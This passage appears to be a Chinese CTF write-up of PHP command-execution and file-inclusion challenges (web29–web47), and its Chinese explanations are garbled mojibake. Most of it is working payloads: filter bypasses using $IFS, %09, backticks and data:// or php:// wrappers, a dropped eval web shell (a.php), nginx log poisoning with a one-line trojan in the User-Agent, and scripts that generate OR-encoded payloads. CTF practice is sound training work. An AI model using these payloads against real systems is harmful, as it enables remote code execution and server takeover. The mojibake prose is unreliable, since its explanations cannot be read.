fl</em>ag.phpâ€);<br>5ã€<br>c&#x3D;system(â€œcp fl*g.php a.txt â€œ);<br>è®¿é—®&#x2F;a.txt<br>6ã€ç›´æ¥è¾“å‡ºä¸€ä¸ªphpè¿™æ ·å°±å¯ä»¥ç›´æ¥åˆ©ç”¨ä»£ç äº†,æ³¨æ„ä¹Ÿæ˜¯å³é”®æŸ¥çœ‹æºä»£ç <br>c&#x3D;system(â€˜echo -e â€œ &lt;?php \n error_reporting(0); \n  $c&#x3D; $_GET[&#39;c&#39;]; \n eval($c); â€œ &gt; a.phpâ€™);<br>&#x2F;a.php?c&#x3D;system(â€œtac flag.phpâ€);</p></blockquote><h4 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h4><p>è¿‡æ»¤äº†systemå‡½æ•°ï¼Œå¯ä»¥ç”¨åå¼•å·æ¥å‘½ä»¤æ‰§è¡Œ</p><p>Payload:</p><blockquote><p>1ã€nlå‘½ä»¤ï¼Œå¸¦ç€è¡Œå·è¾“å‡ºæ–‡æœ¬å†…å®¹<br>c&#x3D;echo <code>nl fl&#39;&#39;ag.p&#39;&#39;hp</code>;<br>echo <code>cat fl&#39;&#39;ag.p&#39;&#39;hp</code>;<br>echo <code>cat fl*ag.p*hp</code>;<br>echo <code>cp fl*ag.p*hp 1.txt | cat 1.txt</code>;<br>å•å¼•å·ï¼šå¼•å·é‡Œé¢çš„å†…å®¹ä¼šåŸå°ä¸åŠ¨çš„æ˜¾ç¤ºå‡ºæ¥ï¼ˆå¾ˆç®€å•ï¼Œä¸åšè§£é‡Šï¼‰<br>åŒå¼•å·ï¼šé‡Œé¢çš„ç‰¹æ®Šç¬¦å·ä¼šè¢«è§£æï¼Œå˜é‡ä¹Ÿä¼šè¢«æ›¿æ¢ï¼ˆ\ ç¬¦å·ã€ç©ºæ ¼ä¼šè¢«è§£æï¼‰<br>echo \a -&gt; a<br>echo â€œ\aâ€ -&gt; \a<br>2ã€passthruå‡½æ•°ï¼ŒåŒsystemï¼ŒåŒç†execï¼Œshell_execä¹Ÿå¯ä»¥ç”¨ï¼Œä¸è¿‡æœ‰ç‚¹éº»çƒ¦<br>c&#x3D;passthru(â€œcat fla*â€);<br>c&#x3D;exec(passthru(â€œcat fla*â€));<br>c&#x3D;shell_exec(passthru(â€œcat fla*â€));</p></blockquote><h4 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h4><p>é¢˜ç›®è¿‡æ»¤äº†ç©ºæ ¼ï¼Œå•å¼•å·ï¼Œå°æ•°ç‚¹ï¼Œ</p><p>è¿‡æ»¤äº†ç©ºæ ¼ï¼Œå¯ä»¥ä½¿ç”¨%09æ›¿ä»£ï¼›ä¹Ÿå¯ä»¥ä½¿ç”¨{$IFS}ï¼Œå› ä¸ºå•å¼•å·è¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥å¦‚æœä½¿ç”¨c&#x3D;passthru(â€œcat%09fla*â€);æˆ–è€…{$IFS}éƒ½ä¸ä¼šè¢«è§£é‡Šä¸ºç©ºæ ¼</p><p>æ‰€ä»¥æ„é€ å¦‚ä¸‹Payload:</p><blockquote><p>1ã€ä½¿ç”¨evalåµŒå¥—ã€‚å…·ä½“å‚æ•°ï¼špassthru ç»“åˆ%09ï¼Œä¹Ÿå¯ä»¥ç›´æ¥rceï¼Œå› ä¸ºæ²¡æœ‰å¯¹å…¶ä»–å‚æ•°è¿›è¡Œè¿‡æ»¤<br>å…¶ä¸­%09ç»•è¿‡ç©ºæ ¼ ?c&#x3D;eval($_GET[1]);&amp;1&#x3D;passthru(â€œtac%09fla*â€); è¿™é‡Œéœ€è¦æ³¨æ„æ‹¬å·çš„é—­åˆï¼Œ&amp;çš„è¿æ¥ã€‚<br>2ã€ä½¿ç”¨å‚æ•°ï¼špassthruç»“åˆ $IFS$9<br>å…¶ä¸­$IFS$9ç»•è¿‡ç©ºæ ¼ï¼Œæ³¨æ„è½¬ä¹‰$ç¬¦å· ?<br>$9æ˜¯å½“å‰ç³»ç»Ÿshellè¿›ç¨‹çš„ç¬¬ä¹ä¸ªå‚æ•°çš„æŒæœ‰è€…ï¼Œå®ƒå§‹ç»ˆä¸ºç©ºå­—ç¬¦ä¸²ã€‚c&#x3D;eval($_GET[1]);&amp;1&#x3D;passthru(â€œtac$IFS$9fla*â€);<br>3ã€ä½¿ç”¨æœªè¢«è¿‡æ»¤çš„å‘½ä»¤ã€‚passthruç›´æ¥è¯»å–<br>?c&#x3D;passthru(%22tac$IFS$9fla*%22); ä¹Ÿå°±æ˜¯passthru(â€œtac$IFS$9fla*â€);<br>4ã€ä½¿ç”¨pos(localeconv)æ¥è·å–å°æ•°ç‚¹<br>localeconvå¯ä»¥è¿”å›åŒ…æ‹¬å°æ•°ç‚¹åœ¨å†…çš„ä¸€ä¸ªæ•°ç»„ï¼›poså»å–å‡ºæ•°ç»„ä¸­å½“å‰ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œä¹Ÿå°±æ˜¯å°æ•°ç‚¹ã€‚ scandirå¯ä»¥ç»“åˆå®ƒæ‰«æå½“å‰ç›®å½•å†…å®¹ã€‚ ?c&#x3D;print_r(scandir(pos(localeconv()))); å¯ä»¥çœ‹åˆ°å½“å‰ç›®å½•ä¸‹æœ‰flag.php é€šè¿‡array_reverseæŠŠæ•°ç»„é€†åºï¼Œé€šè¿‡nextå–åˆ°ç¬¬äºŒä¸ªæ•°ç»„å…ƒç´ ï¼Œä¹Ÿå³flag.php ç„¶å?c&#x3D;show_source(next(array_reverse(scandir(pos(localeconv())))));</p></blockquote><h4 id="web32-nginxæ—¥å¿—æ³¨å…¥"><a href="#web32-nginxæ—¥å¿—æ³¨å…¥" class="headerlink" title="web32(nginxæ—¥å¿—æ³¨å…¥)"></a>web32(nginxæ—¥å¿—æ³¨å…¥)</h4><p>è¿‡æ»¤æ‰äº†flag|system|php|cat|sort|shell|.| |â€™|&#96;|echo|;|( åŒ…æ‹¬ç‚¹ï¼Œå•å¼•å·ï¼Œåå¼•å·ï¼Œåˆ†å·ï¼Œæ‹¬å·</p><p>æ‰€ä»¥è¿™é‡Œéœ€è¦ä½¿ç”¨includeæ¥æ„é€ Payload:</p><blockquote><p>1ã€?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php<br>å…¶ä¸­?&gt;ä»£æ›¿åˆ†å·ï¼Œé¡µé¢ä¼šæ˜¾ç¤ºflag.phpå†…å®¹çš„base64ç¼–ç ï¼Œè§£ç å³å¯è·å–flag<br>è¿˜æœ‰ä¸€ç§æ–¹æ³•ï¼Œæ—¥å¿—æ³¨å…¥<br>2ã€?c&#x3D;include$_GET[1]?%3E&amp;1&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log<br>&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.logæ˜¯nginxé»˜è®¤çš„accessæ—¥å¿—è·¯å¾„ï¼Œè®¿é—®è¯¥è·¯å¾„æ—¶ï¼Œåœ¨User-Agentä¸­å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œç„¶åç”¨ä¸­å›½èšå‰‘è¿æ¥å³å¯</p><p>3ã€?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;input</p><p>ä¹Ÿå¯ä»¥ä½¿ç”¨php:&#x2F;&#x2F;inputç„¶åä½¿ç”¨postæ‰§è¡Œå‘½ä»¤<?php system("cat flag.php")?></p></blockquote><h4 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h4><p>ç›¸æ¯”ä¸Šä¸€å…³åªå¤šè¿‡æ»¤äº†â€œ</p><p>æ‰€ä»¥web32Payloadä¾æ—§é€‚ç”¨</p><h4 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h4><p>å¤šè¿‡æ»¤ä¸€ä¸ª:  ä¹‹å‰payloadä¾æ—§é€‚ç”¨</p><h4 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h4><p>å¤šè¿‡æ»¤ä¸€ä¸ª&#x3D; &lt;   ä¹‹å‰payloadä¾æ—§é€‚ç”¨</p><h4 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h4><p>å¤šè¿‡æ»¤äº†æ•°å­—  GETå‚æ•°æ”¹ä¸ºaå³å¯</p><h4 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>preg <span class="token keyword">match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/i"</span>ï¼Œ<span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><blockquote><p>1ã€ä½¿ç”¨php:&#x2F;&#x2F;input POSTå†™å…¥phpä»£ç </p><?php system("cat fla*")?><p>2ã€ä½¿ç”¨dataåè®®</p><p>c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4&#x3D;</p><?php system("tac flag.php")?></blockquote><h4 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h4><p>web37Payloadç…§æ ·æ‰“</p><h4 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> </code></pre><p>?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php%20system("tac fla*.php");?><br>?&gt;ä¸ºphpç»“æŸç¬¦å·ï¼Œåé¢æ‹¼æ¥çš„.phpä¼šè¢«å¿½ç•¥æ‰ï¼Œä¸ç”¨ç®¡</p><h4 id="web40-æ•°ç»„å‡½æ•°"><a href="#web40-æ•°ç»„å‡½æ•°" class="headerlink" title="web40(æ•°ç»„å‡½æ•°)"></a>web40(æ•°ç»„å‡½æ•°)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\ï¼ˆ|\ï¼‰|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\'|\"|\,|\&lt;|\.|\>|\/|\?|\\\\/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>     </code></pre><p>è¿™æ¬¡æ·»åŠ äº†å¾ˆå¤šè¿‡æ»¤ï¼Œä¹‹å‰æ–¹æ³•å¤§å¤šéƒ½ä¸è¡Œäº†</p><blockquote><p>1ã€c&#x3D;show_source(next(array_reverse(scandir(pos(localeconv()))))); æˆ–è€… c&#x3D;show_source(next(array_reverse(scandir(getcwd()))));</p><p>getcwd() å‡½æ•°è¿”å›å½“å‰å·¥ä½œç›®å½•ã€‚å®ƒå¯ä»¥ä»£æ›¿pos(localeconv())</p><p>localeconv()ï¼šè¿”å›åŒ…å«æœ¬åœ°åŒ–æ•°å­—å’Œè´§å¸æ ¼å¼ä¿¡æ¯çš„å…³è”æ•°ç»„ã€‚è¿™é‡Œä¸»è¦æ˜¯è¿”å›å€¼ä¸ºæ•°ç»„ä¸”ç¬¬ä¸€é¡¹ä¸ºâ€.â€</p><p>pos():è¾“å‡ºæ•°ç»„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œä¸æ”¹å˜æŒ‡é’ˆï¼›</p><p>current() å‡½æ•°è¿”å›æ•°ç»„ä¸­çš„å½“å‰å…ƒç´ ï¼ˆå•å…ƒï¼‰,é»˜è®¤å–ç¬¬ä¸€ä¸ªå€¼ï¼Œå’Œpos()ä¸€æ ·</p><p>scandir() å‡½æ•°è¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„ã€‚è¿™é‡Œå› ä¸ºå‚æ•°ä¸ºâ€.â€æ‰€ä»¥éå†å½“å‰ç›®å½•</p><p>array_reverse():æ•°ç»„é€†ç½®</p><p>next():å°†æ•°ç»„æŒ‡é’ˆæŒ‡å‘ä¸‹ä¸€ä¸ªï¼Œè¿™é‡Œå…¶å®å¯ä»¥çœç•¥å€’ç½®å’Œæ”¹å˜æ•°ç»„æŒ‡é’ˆï¼Œç›´æ¥åˆ©ç”¨[2]å–å‡ºæ•°ç»„ä¹Ÿå¯ä»¥</p><p>show_source():æŸ¥çœ‹æºç </p><p>pos() å‡½æ•°è¿”å›æ•°ç»„ä¸­çš„å½“å‰å…ƒç´ çš„å€¼ã€‚è¯¥å‡½æ•°æ˜¯current()å‡½æ•°çš„åˆ«åã€‚</p><p>æ¯ä¸ªæ•°ç»„ä¸­éƒ½æœ‰ä¸€ä¸ªå†…éƒ¨çš„æŒ‡é’ˆæŒ‡å‘å®ƒçš„â€å½“å‰â€å…ƒç´ ï¼Œåˆå§‹æŒ‡å‘æ’å…¥åˆ°æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ã€‚</p><p>æç¤ºï¼šè¯¥å‡½æ•°ä¸ä¼šç§»åŠ¨æ•°ç»„å†…éƒ¨æŒ‡é’ˆã€‚</p><p>ç›¸å…³çš„æ–¹æ³•ï¼š</p><p>current()è¿”å›æ•°ç»„ä¸­çš„å½“å‰å…ƒç´ çš„å€¼ã€‚</p><p>end()å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</p><p>next()å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</p><p>prev()å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸Šä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</p><p>reset()å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</p><p>each()è¿”å›å½“å‰å…ƒç´ çš„é”®åå’Œé”®å€¼ï¼Œå¹¶å°†å†…éƒ¨æŒ‡é’ˆå‘å‰ç§»åŠ¨ã€‚</p><p>2ã€c&#x3D;eval(array_pop(next(get_defined_vars())));&#x2F;&#x2F;éœ€è¦POSTä¼ å…¥å‚æ•°ä¸º1&#x3D;system(â€˜tac fl*â€™);</p><p>åŒç†?cmd&#x3D;system(â€œtac%20flag.phpâ€);&amp;c&#x3D;eval(pos(pos(get_defined_vars())));</p><p>get_defined_vars() è¿”å›ä¸€ä¸ªåŒ…å«æ‰€æœ‰å·²å®šä¹‰å˜é‡çš„å¤šç»´æ•°ç»„ã€‚è¿™äº›å˜é‡åŒ…æ‹¬ç¯å¢ƒå˜é‡ã€æœåŠ¡å™¨å˜é‡å’Œç”¨æˆ·å®šä¹‰çš„å˜é‡ï¼Œä¾‹å¦‚GETã€POSTã€FILEç­‰ç­‰ã€‚</p><p>next()å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</p><p>array_pop() å‡½æ•°åˆ é™¤æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ å¹¶è¿”å›å…¶å€¼ã€‚</p><p>3ã€c&#x3D;session_start();system(session_id());<br>      passid&#x3D;ls</p><p><img src="web40.png" alt="web40" loading="lazy"></p><p>é€šè¿‡cookieè·å¾—å‚æ•°è¿›è¡Œå‘½ä»¤æ‰§è¡Œ</p><p>å—phpç‰ˆæœ¬å½±å“ 5.5 -7.1.9å‡å¯ä»¥æ‰§è¡Œï¼Œå› ä¸ºsession_idè§„å®šä¸º0-9ï¼Œa-z,A-Z,-ä¸­çš„å­—ç¬¦ã€‚åœ¨5.5ä»¥ä¸‹åŠ7.1ä»¥ä¸Šå‡æ— æ³•å†™å…¥é™¤æ­¤ä¹‹å¤–çš„å†…å®¹ã€‚ä½†æ˜¯ç¬¦åˆè¦æ±‚çš„å­—ç¬¦è¿˜æ˜¯å¯ä»¥çš„ã€‚</p></blockquote><h4 id="web41-rce-or"><a href="#web41-rce-or" class="headerlink" title="web41(rce_or)"></a>web41(rce_or)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i'</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"echo(<span class="token interpolation"><span class="token variable">$c</span></span>);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> </code></pre><p>è¿‡æ»¤äº†<code>$ã€+ã€-ã€^ã€~</code>ä½¿å¾—<strong>å¼‚æˆ–è‡ªå¢å’Œå–å</strong>æ„é€ å­—ç¬¦éƒ½æ— æ³•ä½¿ç”¨ï¼ŒåŒæ—¶è¿‡æ»¤äº†å­—æ¯å’Œæ•°å­—ã€‚ä½†æ˜¯ç‰¹æ„ç•™äº†ä¸ª<code>|</code>è¿ç®—ç¬¦</p><p>æ ¹æ®æ­£åˆ™åŒ¹é…ç”Ÿæˆå¯ç”¨å­—ç¬¦çš„é›†åˆrce_or.php</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$myfile</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"rce_or.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$contents</span><span class="token operator">=</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$j</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">&lt;</span><span class="token number">256</span> <span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$hex_i</span><span class="token operator">=</span><span class="token string single-quoted-string">'0'</span><span class="token operator">.</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$hex_i</span><span class="token operator">=</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token operator">&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$hex_j</span><span class="token operator">=</span><span class="token string single-quoted-string">'0'</span><span class="token operator">.</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$hex_j</span><span class="token operator">=</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$preg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$preg</span> <span class="token punctuation">,</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$hex_i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">preg_match</span><span class="token punctuation">(</span><span class="token variable">$preg</span> <span class="token punctuation">,</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$hex_j</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token string single-quoted-string">'%'</span><span class="token operator">.</span><span class="token variable">$hex_i</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token string single-quoted-string">'%'</span><span class="token operator">.</span><span class="token variable">$hex_j</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token class-name">urldecode</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">>=</span><span class="token number">32</span><span class="token operator">&amp;</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">126</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$contents</span><span class="token operator">=</span><span class="token variable">$contents</span><span class="token operator">.</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" "</span><span class="token operator">.</span><span class="token variable">$a</span><span class="token operator">.</span><span class="token string double-quoted-string">" "</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">,</span><span class="token variable">$contents</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>æ ¹æ®å¯ç”¨çš„å­—ç¬¦ç”ŸæˆPayload</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> urllib<span class="token keyword">from</span> sys <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> os<span class="token keyword">def</span> <span class="token function">action</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span><span class="token punctuation">:</span>   s1<span class="token operator">=</span><span class="token string">""</span>   s2<span class="token operator">=</span><span class="token string">""</span>   <span class="token keyword">for</span> i <span class="token keyword">in</span> arg<span class="token punctuation">:</span>       f<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"rce_or.txt"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span>       <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>           t<span class="token operator">=</span>f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span>           <span class="token keyword">if</span> t<span class="token operator">==</span><span class="token string">""</span><span class="token punctuation">:</span>               <span class="token keyword">break</span>           <span class="token keyword">if</span> t<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span>i<span class="token punctuation">:</span>               <span class="token comment">#print(i)</span>               s1<span class="token operator">+=</span>t<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span>               s2<span class="token operator">+=</span>t<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>               <span class="token keyword">break</span>       f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>   output<span class="token operator">=</span><span class="token string">"(\""</span><span class="token operator">+</span>s1<span class="token operator">+</span><span class="token string">"\"|\""</span><span class="token operator">+</span>s2<span class="token operator">+</span><span class="token string">"\")"</span>   <span class="token keyword">return</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span>   <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>   param<span class="token operator">=</span>action<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"\n[+] your functionï¼š"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token operator">+</span>action<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"[+] your commandï¼š"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n[*] result:\n"</span><span class="token operator">+</span>param<span class="token punctuation">)</span></code></pre><p><img src="web41.png" loading="lazy"></p><h4 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" >/dev/null 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre><p>Payload:</p><blockquote><p>?c&#x3D;cat flag.php;  ?c&#x3D;cat flag.php||  ?c&#x3D;cat flag.php%26(&amp;)    c&#x3D;nl flag.php%0a  ?c&#x3D;echo <code>tac fl*</code>||</p><p>ä½¿ç”¨ â€œ ; â€œ â€œ || â€œ â€œ &amp; â€œ â€œ &amp;&amp; â€œ åˆ†éš”</p><p>&#x2F;dev&#x2F;null 2&gt;&amp;1 æ„æ€æ˜¯å°†æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯éƒ½é‡å®šå‘åˆ° &#x2F;dev&#x2F;null å³ä¸å›æ˜¾<br>; åˆ†å·<br>| åªæ‰§è¡Œåé¢é‚£æ¡å‘½ä»¤<br>|| åªæ‰§è¡Œå‰é¢é‚£æ¡å‘½ä»¤<br>&amp; ä¸¤æ¡å‘½ä»¤éƒ½ä¼šæ‰§è¡Œ<br>&amp;&amp; ä¸¤æ¡å‘½ä»¤éƒ½ä¼šæ‰§è¡Œ</p></blockquote><h4 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h4><p>å¤šè¿‡æ»¤äº†cat,\å’Œï¼›ï¼Œä½¿ç”¨å…¶ä»–Payloadå³å¯</p><h4 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h4><p>å¤šè¿‡æ»¤äº†flagï¼Œä½¿ç”¨fla*å³å¯</p><h4 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h4><p>è¿‡æ»¤äº†ç©ºæ ¼ï¼Œä½¿ç”¨$IFSæˆ–è€…%09ç»•è¿‡å³å¯</p><h4 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h4><p>è¿‡æ»¤äº†$å’Œ*ï¼ŒPayloadå¦‚ä¸‹ï¼š</p><blockquote><p>1ã€?c&#x3D;nl&lt;flaâ€™â€™g.php||</p><p>2ã€?c&#x3D;ca\t&lt;fl\ag.php||</p></blockquote><h4 id="web47"><a href="#web47" class="headerlink" title="web47"></a>web47</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">preg_match</span><span 